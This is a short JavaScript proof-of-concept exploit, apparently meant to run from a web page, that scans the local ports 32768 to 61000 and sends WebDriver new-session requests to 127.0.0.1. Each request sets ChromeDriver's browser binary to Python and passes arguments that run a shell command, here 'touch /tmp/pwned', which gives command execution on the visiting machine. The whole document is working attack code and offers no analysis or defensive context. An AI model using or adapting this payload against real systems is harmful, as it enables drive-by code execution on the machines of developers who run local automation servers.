let options = {
    method: "POST",
    mode: "no-cors",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
        capabilities: {
        alwaysMatch: {
            browserName: "chrome",
            "goog:chromeOptions": {
            binary: "/usr/local/bin/python",
            args: ["-c", "__import__('os').system('touch /tmp/pwned')"]
            },
        },
        },
    }),
    };
for (let port = 32768; port < 61000; port++) {
fetch(`http://127.0.0.1:${port}/session`, options);
}